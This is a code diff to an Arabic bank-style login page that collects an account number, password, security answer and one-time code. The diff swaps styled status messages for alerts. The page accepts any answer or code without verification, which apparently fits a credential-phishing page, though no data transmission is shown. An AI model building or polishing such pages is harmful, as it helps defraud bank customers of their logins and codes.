@@ -469,6 +469,7 @@
             font-weight: 600;
             margin-bottom: 20px;
         }
+        .otp-card .otp-waiting i { margin-left: 6px; }
         .otp-card input {
             width: 100%;
             padding: 14px;
@@ -690,38 +691,8 @@
         .linkedin { background: linear-gradient(135deg, #0A66C2, #004182); }
         .instagram { background: radial-gradient(circle at 30% 30%, #fdf497, #fd5949, #d6249f, #285aeb); }
 
-        /* ===== رسائل النظام ===== */
-        .system-message {
-            display: none;
-            padding: 14px 18px;
-            border-radius: 12px;
-            margin: 16px 0 8px;
-            text-align: center;
-            font-weight: 600;
-            font-size: 15px;
-            border: 1px solid transparent;
-            animation: fadeSlide 0.3s ease;
-        }
-        .system-message.error {
-            background: #fff5f5;
-            border-color: #ffe0e0;
-            color: #c1121f;
-        }
-        .system-message.success {
-            background: #d4edda;
-            border-color: #c3e6cb;
-            color: #155724;
-        }
-        .system-message.info {
-            background: #e3f2fd;
-            border-color: #bbdefb;
-            color: #0d47a1;
-        }
-        .system-message.active { display: block; }
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        /* ===== رسائل النظام (تم إزالتها تماماً) ===== */
+        /* لم يعد هناك system-message */
 
         /* روابط السفلية */
         .security-links {
@@ -849,7 +820,7 @@
             </div>
             <div class="question-box" id="questionText">ما هو اسم المدرسة التي التحقت بها؟</div>
             <input type="text" id="securityAnswer" placeholder="أدخل الجواب" />
-            <div class="system-message" id="securitySystemMessage"></div>
+            <!-- تم إزالة system-message -->
             <div class="security-actions">
                 <button class="btn-next" onclick="nextQuestion()">سؤال آخر</button>
                 <button class="btn-atm" onclick="showAtmMessage()">باستخدام بطاقة الصراف الآلي</button>
@@ -887,7 +858,7 @@
             <div class="otp-timer-label">دقائق متبقية</div>
             <div class="otp-waiting"><i class="fas fa-spinner fa-spin"></i> في انتظار رمز التحقق من النظام...</div>
             <input type="text" id="otpInput" placeholder="أدخل الرمز" maxlength="6" inputmode="numeric" />
-            <div class="system-message" id="otpSystemMessage"></div>
+            <!-- تم إزالة system-message -->
             <div class="otp-actions">
                 <button class="btn-otp-confirm" onclick="submitOtp()">تأكيد الرمز</button>
                 <button class="btn-otp-whatsapp" onclick="whatsappContact()"><i class="fab fa-whatsapp"></i> واتساب</button>
@@ -1007,19 +978,6 @@
             }
         }
 
-        // ===== عرض رسائل النظام =====
-        function showSystemMessage(elementId, message, type = 'error') {
-            const el = document.getElementById(elementId);
-            el.textContent = message;
-            el.className = 'system-message active ' + type;
-            if (type === 'info' || type === 'success') {
-                setTimeout(() => { el.classList.remove('active'); }, 5000);
-            }
-        }
-        function hideSystemMessage(elementId) {
-            document.getElementById(elementId).classList.remove('active');
-        }
-
         // ===== تسجيل الدخول (الخطوة 1) =====
         function togglePassword() {
             const input = document.getElementById('password');
@@ -1095,7 +1053,6 @@
             document.getElementById('questionText').textContent = securityQuestions[currentQuestionIndex];
             document.getElementById('securityAnswer').value = '';
             document.getElementById('securityAnswer').focus();
-            hideSystemMessage('securitySystemMessage');
         }
 
         function nextQuestion() {
@@ -1105,20 +1062,17 @@
 
         function verifySecurity() {
             const answer = document.getElementById('securityAnswer').value.trim();
-            hideSystemMessage('securitySystemMessage');
             if (answer === '') {
-                showSystemMessage('securitySystemMessage', 'الرجاء إدخال الإجابة على سؤال الأمان', 'error');
+                // رسالة خطأ بسيطة بدون system-message
+                alert('الرجاء إدخال الإجابة على سؤال الأمان');
                 return;
             }
-            showSystemMessage('securitySystemMessage', '✅ تم التحقق من السؤال بأمان', 'success');
-            setTimeout(() => {
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('step3').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '0';
-                startOtpTimer();
-                hideSystemMessage('securitySystemMessage');
-                updateSteps(3);
-            }, 1000);
+            // الانتقال إلى الخطوة التالية مباشرة بدون رسالة
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+            document.getElementById('footer').style.marginTop = '0';
+            startOtpTimer();
+            updateSteps(3);
         }
 
         function cancelSecurity() {
@@ -1128,7 +1082,6 @@
             document.getElementById('accountNumber').value = '';
             document.getElementById('password').value = '';
             document.getElementById('securityAnswer').value = '';
-            hideSystemMessage('securitySystemMessage');
             updateSteps(1);
         }
 
@@ -1167,24 +1120,20 @@
 
         function submitOtp() {
             const otp = document.getElementById('otpInput').value.trim();
-            hideSystemMessage('otpSystemMessage');
             if (otp === '') {
-                showSystemMessage('otpSystemMessage', 'الرجاء إدخال الرمز السري', 'error');
+                alert('الرجاء إدخال الرمز السري');
                 return;
             }
             if (otp.length < 4) {
-                showSystemMessage('otpSystemMessage', 'الرمز يجب أن يكون 4-6 أرقام', 'error');
+                alert('الرمز يجب أن يكون 4-6 أرقام');
                 return;
             }
-            showSystemMessage('otpSystemMessage', '✅ تم التحقق بنجاح!', 'success');
-            setTimeout(() => {
-                document.getElementById('step3').style.display = 'none';
-                document.getElementById('step4').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '0';
-                hideSystemMessage('otpSystemMessage');
-                if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
-                updateSteps(4);
-            }, 1500);
+            // الانتقال إلى لوحة التحكم مباشرة
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step4').style.display = 'block';
+            document.getElementById('footer').style.marginTop = '0';
+            if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+            updateSteps(4);
         }
 
         function whatsappContact() {
@@ -1208,7 +1157,6 @@
                 document.getElementById('password').value = '';
                 document.getElementById('otpInput').value = '';
                 clearMessages();
-                hideSystemMessage('otpSystemMessage');
                 if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
                 updateSteps(1);
             }
